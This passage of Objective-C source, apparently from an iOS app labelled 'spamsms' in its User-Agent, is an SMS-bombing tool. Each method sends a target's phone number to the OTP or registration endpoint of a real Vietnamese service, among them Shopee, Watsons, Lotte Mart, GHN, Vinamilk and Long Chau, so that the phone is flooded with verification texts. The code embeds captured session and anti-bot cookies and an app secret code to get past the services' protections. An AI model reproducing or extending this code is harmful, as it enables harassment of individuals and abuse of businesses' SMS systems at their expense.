bJBpvtlV9oRKOtKCBZ2icQXCYRrXXVpQl1UEwk3S8se7S27Karb7Gb2WwTpceTnUyoDKA9qIUbQ5uvewk7W3eVZ0jXE05QSWhTPZ6WtcZjEnZ3p2mSqzfSJyyg85dVsaWiLTXLh5C+dlPEPaKrgNjCiL7RGqRbU1LIphPIqtF3b7VwM+3W7F9/mS9ES8hq91h1hZytZHDZkDGnI2FUKeejYMyJf3JxZUa+Oue4Fb044zyFE34af7SHqnykpHjUpBd+o/1swC00CW1ayLOUmUqkhpMy+qQA19PsFVfaWPswG75exPqtxOCLYW/s+ki9RHdB8Jzd3C0ScuTmcartUnx5JAzzbzvdyoTIukt7SZhJEcpIFIOaSSD3coqC3tKWyOk9VLeA1QQ79OyDc6Fsjcoo8RoNb+zzza2wDLKti5BDT0x7yfyayMQVfKgxTMR/R1x0o/qneLoYP3qFFftcNs1IKj2rWUT06I7A0HjKoe8wDfRlhUYrl/0LFdT/7hPhjddce0PFqdNlfxBOsXr8y+kdnOcpVtcH790abplM4d5jWmRzw1s8B3w//+pclUATmbjGukndFl1MxFkqhNhlAS4CEtiuF6S7jGq6COA1kdToKn1955hg==",
        @"TCH-DEVICE-ID": @"C8534CAF-1C8B-4238-A233-2B86E5DA7A96",
        @"Accept-Language": @"vi"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"phone\":{\"region_code\":\"+84\",\"phone_number\":\"%@\"}}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"The Coffee Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"The Coffee Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)dienmayxanh {
    NSURL *url = [NSURL URLWithString:@"https://www.dienmayxanh.com/lich-su-mua-hang/GetVerifyCode"];
    NSDictionary *headers = @{
        @"User-Agent": @"spamsms/1 CFNetwork/1474 Darwin/23.0.0",
        @"Content-Type": @"application/x-www-form-urlencoded",
        @"Accept-Language": @"vi-VN,vi;q=0.9",
        @"Cookie": @"_oauthCDP_WebDMX=2EICzzDZp6mafDUUPhcXbSxwjvY9BSbQiMGx5ZzEhFOiexejqCaDql3dM90SdjdNmTxPXcVbOXYxgfkzU59wyxxVaKS0GHtOVs9rmg94SDIynW46h1xqLJAytqg47So3gQSr0Y3OeLrTY2QtrAluYPl2slyiut6YQVQni7kAmkt5OrPyKtWX2QiSEpYHrmg94nl39fnsn5a8mAa1OkcmjrUlScpXrmg94frmg94a_TW7LIfzqf2MA4NVkheLuQCaS3k6s_1ooKhkFqHr2nuExlxf1u2AcKUazMuIh75kkBpcioZOWDUHB80_ZOk-"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"phoneNumber=%@", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
    [data appendData:[@"&isReSend=false" dataUsingEncoding:NSUTF8StringEncoding]];
    [data appendData:[@"&sendOTPType=1" dataUsingEncoding:NSUTF8StringEncoding]];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"Điện Máy Xanh Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"Điện Máy Xanh Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)kingfoodmart {
    NSURL *url = [NSURL URLWithString:@"https://api.kingfoodmart.com/v1/otp/register"];
    NSDictionary *headers = @{
        @"User-Agent": @"spamsms/1 CFNetwork/1474 Darwin/23.0.0",
        @"Content-Type": @"application/json",
        @"accept-language": @"vi-VN,vi;q=0.9"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"phone\":\"%@\"}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"kingfoodmart Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"kingfoodmart Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)ghn {
    NSURL *url = [NSURL URLWithString:@"https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp"];
    NSDictionary *headers = @{
        @"User-Agent": @"spamsms/1 CFNetwork/1474 Darwin/23.0.0",
        @"Content-Type": @"application/json",
        @"accept-language": @"vi-VN,vi;q=0.9"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"type\":\"register\",\"phone\":\"%@\"}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"ghn Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"ghn Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)lottemart {
    NSURL *url = [NSURL URLWithString:@"https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp"];
    NSDictionary *headers = @{
        @"User-Agent": @"spamsms/1 CFNetwork/1474 Darwin/23.0.0",
        @"Content-Type": @"application/json",
        @"accept-language": @"vi-VN,vi;q=0.9"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"username\":\"%@\",\"case\":\"register\"}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"lottemart Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"lottemart Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)vayvnd {
    NSURL *url = [NSURL URLWithString:@"https://api.vayvnd.vn/v2/users"];
    NSDictionary *headers = @{
        @"User-Agent": @"spamsms/1 CFNetwork/1474 Darwin/23.0.0",
        @"Content-Type": @"application/json",
        @"accept-language": @"vi-VN,vi;q=0.9"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"utm\":[],\"phone\":\"%@\"}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"vayvnd Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"vayvnd Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)vato {
    NSURL *url = [NSURL URLWithString:@"https://api.vato.vn/api/v3/public/user/login"];
    NSDictionary *headers = @{
        @"User-Agent": @"spamsms/1 CFNetwork/1474 Darwin/23.0.0",
        @"Content-Type": @"application/json",
        @"accept-language": @"vi-VN,vi;q=0.9"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"firebase_sms_auth\":true,\"mobile\":\"%@\",\"country_code\":\"VN\"}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"vato Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"vato Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)nhathuoclongchau {
    NSURL *url = [NSURL URLWithString:@"https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification"];
    NSDictionary *headers = @{
        @"User-Agent": @"spamsms/1 CFNetwork/1474 Darwin/23.0.0",
        @"Content-Type": @"application/json",
        @"accept-language": @"vi-VN,vi;q=0.9"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"phoneNumber\":\"%@\",\"fromSys\":\"WEBKHLC\",\"otpType\":0}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"Nhà Thuốc Long Châu Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"Nhà Thuốc Long Châu Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
    
}

-(void)vinamilk {
    NSURL *url = [NSURL URLWithString:@"https://new.vinamilk.com.vn/api/account/getotp"];
    NSDictionary *headers = @{
        @"User-Agent": @"spamsms/1 CFNetwork/1474 Darwin/23.0.0",
        @"Content-Type": @"application/json",
        @"accept-language": @"vi-VN,vi;q=0.9",
        @"Cookie": @"__cf_bm=uteOZ7I.b1Pz_HR3NLHmT9v24eNYy4MTcwXCUM1__yQ-1733323036-1.0.1.1-QvdRQ0qpmy430.aXz68DOfEBrylPlrkms7aNURS_cGtZJn0HXUnHeNHxG8egR_3fpREetSsg_06l31GurVRGYA"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"type\":\"register\",\"phone\":\"%@\"}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"vinamilk Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"vinamilk Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)glxplay {
    NSURL *url = [NSURL URLWithString:@"https://api.glxplay.io/account/phone/verify"];
    NSDictionary *headers = @{
        @"User-Agent": @"spamsms/1 CFNetwork/1474 Darwin/23.0.0",
        @"Content-Type": @"application/json",
        @"accept-language": @"vi-VN,vi;q=0.9"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"phone\":\"%@\"}",phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"glxplay Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"glxplay Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)shopee {
    NSURL *url = [NSURL URLWithString:@"https://shopee.vn/api/v2/authentication/get_otp"];
    NSDictionary *headers = @{
        @"User-Agent": @"spamsms/1 CFNetwork/1474 Darwin/23.0.0",
        @"Content-Type": @"application/json",
        @"accept-language": @"vi-VN,vi;q=0.9",
        @"Cookie": @"SPC_SI=sgVQZwAAAAAzWWJKZjRMYY+gAQAAAAAAd2ExTmh3RUQ="
    };

    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"phone\":\"%@\"}",phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
    
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"shopee Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"shopee Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)watsons {
    NSURL *url = [NSURL URLWithString:@"https://api.watsons.vn/api/v2/wtcvn/otp/send"];
    NSDictionary *headers = @{
        @"User-Agent": @"spamsms/1 CFNetwork/1474 Darwin/23.0.0",
        @"Content-Type": @"application/json",
        @"accept-language": @"vi-VN,vi;q=0.9",
        @"Cookie": @"bm_sv=10AB64F2241A7F3D7CB99548295DC9CD~YAAQjwqrcXLczTOTAQAALMwbkhpUHX0xMrI869IsqYmDiBRWUPFpMReW87MCPsPUaRTpZSzeRpSUG6pafkKe1I7ftrlWyfLzgLRVqrJGQr54rqxVhwnINTA2e9dZJBq/Rw7uAedslm6GlAMjThWpENZMUCR0OFhQ91znY+vlX/3yzv9FFhf14RbidJNTyNkq0i6Mx6h1crKVsBg5+QH7Cdi8wm0PM/dU+znREqKEqzYCMEIzhNcHmccRn1r6HlCq~1; _abck=90FDB4B1BB2A18E9CC8BEBA65D10458B~-1~YAAQjwqrcbzYzTOTAQAATZcakg3S9RLb2FoiaiJRW1up2EPtsuinOoJXxHQr41MltPpPRm9aac/wzKlmIJSAZp/Oq8psrCAgmLpJVX3XP1c3uWX5gRNUWBaSWw+9DOmsKAmsftIG9HBXob6glq1/Vay3ogIm3O9fVk2lfbNWV2ilks8I0M4H3fNKofokWz6rCovwjTzxnnbB2aKrQleq/Nl1uU+VfbGxwp1na09ahfRvwUmBnfLZmZi33El+XINA7OzRRlFlt76r5OohM4b5KGvYHaUZDfNfLAEi6qa9pIWgyMrLEHqMfHlhmdDwXdp4LI82BD7rctFCy3bkc8jY33blmjLMpxASyY8YeqART+Oiw7ZG5ULgEOkrD0YIqJCY3pKQuRNKRCow2sYe8BdSkqyHClvjGPRLiFUjIw==~-1~-1~-1; ak_bmsc=C20894540118757235F526B7519D3618~000000000000000000000000000000~YAAQjwqrcb3YzTOTAQAATZcakhpJsSZKQeQ/7xyesxfOBBDQVqVhrVeslEDB5qMISIMd2xjRxLQsm0/69cHDEM4og4PmstzEl+BzUa0EzTU1aPbwCSRJvk5r6NsITbpM1WLaByGBRepynLmL57kxyuYFFaDEKxi9i9Kmp9YfxtxD2N1GaDMl+DK0rZfJwzKJYb0EHQ87xzyb2VPhpfZvGPF0NifWJz8lzf/NG7tr1rYni0thquX6Ot+zHfTHHXFLepBt7VHM64Ro/fg6t6f/U2+oI0IZcIvTf5pi6guD8ynR62JZ8uysB4n68jeSaggnN89Yv36oRzMFqbE5DXWPvGFKtl150ZlNGS6bfnP3KT3w9pnfDgK852IJTbi4lzN7iH6RmLFHsgFq; bm_sz=B37183069B87BA37281BDC8E064225FF~YAAQjwqrcb7YzTOTAQAATZcakhohJP44dAowX7GoFe8Y0KciEASJ49OdffEYPWEyceKUc0NWSg3mSRVduWK3vro9/IgfL+esT96NG6jVbOwFto+yxk7JcQlP83K/57kCSQos8cwzRAgIvNGJs47V3srxVsaa+HoDHpn75tebOVnefk3/r41TEFrlho8meBu3d0f9QcPHZQtLVw9r/Mlp5NK1KDhNMDJPIp3gXv13Tw4EJMrBqsZ7wSmYogH56F1qM+PIbMGy2T9mLf3r5VF/sojVqUac+dG469UaYDPmF/a7Vy6ANO6Lo/sxQbzJrc0Bt8l/yaunGYwQC5KcM2r6Ki8zHkDcSzTvVcswq5Q0vYMxWNhG94o=~3616833~3224630"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"countryCode\":\"84\",\"type\":\"REGISTER\",\"phone\":\"%@\"}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"watsons Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"watsons Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)tokyolife {
    NSURL *url = [NSURL URLWithString:@"https://api-prod.tokyolife.vn/api/v1/users/register"];
    NSDictionary *headers = @{
        @"User-Agent": @"spamsms/1 CFNetwork/1474 Darwin/23.0.0",
        @"Content-Type": @"application/json",
        @"accept-language": @"vi-VN,vi;q=0.9"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"email\":\"test@example.com\",\"name\":\"Test User\",\"phone_number\":\"%@\"}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"tokyolife Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"tokyolife Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)go2joy {
    NSURL *url = [NSURL URLWithString:@"https://production-api.go2joy.vn/api/v2/mobile/users/sendVerifyCode"];
    NSDictionary *headers = @{
        @"User-Agent": @"Hotel/15.58.2 (com.appromobile.Hotel; build:1056; iOS 17.0.2) Alamofire/5.9.1",
        @"Accept-Encoding": @"br;q=1.0, gzip;q=0.9, deflate;q=0.8",
        @"Content-Type": @"application/json",
        @"Secret-Code": @"7bc79fa5139b8266e12993014bb68911",
        @"Localization": @"vi",
        @"Accept-Language": @"vi-VN;q=1.0",
        @"Device-Encode": @"b57bace52e8368a7f331870a87cc0ef6",
        @"requester": @"mobile-app"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"countryCode\":\"84\",\"mobile\":\"%@\"}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"go2joy Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"go2joy Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}
